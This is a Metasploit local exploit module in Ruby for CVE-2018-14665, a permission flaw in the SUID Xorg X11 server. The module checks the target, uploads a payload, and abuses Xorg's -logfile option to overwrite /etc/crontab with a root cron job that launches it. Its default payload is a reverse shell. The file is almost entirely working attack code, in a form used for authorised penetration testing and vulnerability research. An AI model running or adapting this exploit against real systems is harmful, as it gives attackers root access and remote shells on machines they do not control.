##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking
  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Post::Linux::Priv

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Xorg X11 Server SUID privilege escalation',
      'Description'    => %q{
        This module attempts to gain root privileges with SUID Xorg X11 server
        versions 1.19.0 < 1.20.3.

        A permission check flaw exists for -modulepath and -logfile options when
        starting Xorg.  This allows unprivileged users that start the server
        the ability to elevate privileges and run arbitrary code under root
        privileges.

        This module writes a cron job using the Xorg -logfile option. On write
        crontab.old will be created so it must be removed after exploit.  Cron
        will run a small script to launch a payload. It has been tested with
        OpenBSD 6.3,6.4, and CentOS 7.  Currently CentOS requires console
        auth. Xorg must have SUID permissions and may not start if running.
        On successful exploitation artifacts will be created consistant with
        starting Xorg and running a cron.  If the system is logging cron the
        log will contain many entries for the sections in crontab not valid in
        addition to the path of your payload.

      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Narendra Shinde', # Discovery and exploit
          'Raptor - 0xdea',  # Modified exploit for cron
          'Aaron Ringo'      # Metasploit module
        ],
      'DisclosureDate' => 'Oct 25 2018',
      'References'     =>
        [
           [ 'CVE', '2018-14665' ],
           [ 'BID', '105741' ],
           [ 'URL', 'https://www.securepatterns.com/2018/10/cve-2018-14665-xorg-x-server.html' ],
           [ 'URL', 'https://github.com/0xdea/exploits/blob/master/openbsd/raptor_xorgasm' ]
        ],
      'Platform'       =>  %w(openbsd linux),
      'Arch'           =>    [ARCH_CMD, ARCH_X86, ARCH_X64],
      'SessionTypes'   =>    %w(shell meterpreter),
      'Targets'        =>
        [
           ['OpenBSD', {
            'Platform' => 'unix',
            'Arch' => [ ARCH_CMD ] } ],
           ['Linux x64', {
            'Platform' => 'linux',
            'Arch' => [ ARCH_X64 ] } ],
           ['Linux x86', {
            'Platform' => 'linux',
            'Arch' => [ ARCH_X86 ] } ]
        ],
      'DefaultOptions' =>
        {
          'PAYLOAD' => 'cmd/unix/reverse_openssl'
        },
      'DefaultTarget'  => 0))

     register_advanced_options(
      [
         OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),
         OptString.new('Xdisplay', [ true, 'Display exploit will attempt to use', ':1' ])
      ]
    )
  end


  def check

    #suid program check
    xorg_path = cmd_exec("command -v Xorg")
    unless xorg_path.include?("Xorg")
      vprint_error "Could not find Xorg executable"
      return CheckCode::Safe
    end
    vprint_good "Xorg path found at #{xorg_path}"
    unless setuid? xorg_path
      vprint_error "Xorg binary #{xorg_path} is not SUID"
      return CheckCode::Safe
    end
    vprint_good "Xorg binary #{xorg_path} is SUID"

    #version check
    x_version = cmd_exec("Xorg -version")
    if x_version.include? "Fatal server error:"
      vprint_error "User probably does not have console auth"
      vprint_error "Below returned from trying to run Xorg"
      vprint_error x_version
      return CheckCode::Safe
    end
    v = Gem::Version.new(x_version.scan(/\d.\d+.\d/).first)
    unless v.between?(Gem::Version.new('1.19.0'), Gem::Version.new('1.20.2'))
      vprint_error "Xorg version #{v} not supported"
      return CheckCode::Safe
    end
    vprint_good "Xorg version #{v} is vulnerable"

    #process check for /X
    proc_list = cmd_exec("ps ax")
    if proc_list.include?('/X ')
      vprint_warning('Xorg in process list')
      return CheckCode::Appears
    end
    vprint_good('Xorg does not appear running')
    return CheckCode::Vulnerable
  end

  def on_new_session(session)
    if session.type.to_s.eql? 'meterpreter'
      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'
      session.sys.process.execute '/bin/sh', "-c \"#{@clean_up}\""
    else
      session.shell_command(@clean_up)
    end
    print_good "Returning session after cleaning"
  ensure
    super
  end

  def exploit

    check_status = check
    if check_status == CheckCode::Appears
      print_warning 'X detected in process list, startup may fail'
    elsif check_status ==  CheckCode::Safe
      fail_with Failure::NotVulnerable, 'Target not vulnerable'
    end

    if is_root?
      fail_with Failure::BadConfig, 'This session already has root privileges'
    end
    print_good 'Passed all initial checks for exploit'

    xdisplay = datastore['Xdisplay']
    pscript = "#{datastore['WritableDir']}/.session-#{rand_text_alphanumeric 5..10}"
    @clean_up = "/bin/cat #{pscript}.b > /etc/crontab ; /bin/rm -f #{pscript}.b /etc/crontab.old"

    #Uploading file crontab will run
    print_status 'Uploading your payload, this could take a while'
    write_file(pscript,payload.encoded)
    register_file_for_cleanup pscript
    chmod pscript

    # Exploit steps on crontab so backing it up
    cmd_exec "cat /etc/crontab > #{pscript}.b"
    # Actual exploit with cron overwrite
    print_status 'Trying /etc/crontab overwrite'
    cmd_exec "cd /etc ; Xorg -fp '* * * * * root #{pscript}' -logfile crontab #{xdisplay} & >/dev/null"
    Rex.sleep 5
    cmd_exec "pkill Xorg"
    Rex.sleep 5
    cron_check = cmd_exec "grep -F #{pscript} /etc/crontab"
    unless cron_check.include? pscript
      fail_with Failure::NotVulnerable, '/etc/crontab not modified'
    end
    print_good '/etc/crontab overwrite successful'

    12.times do
      print_status 'Waiting on cron to run'
      Rex.sleep 10
      break if session_created?
    end
  end
end
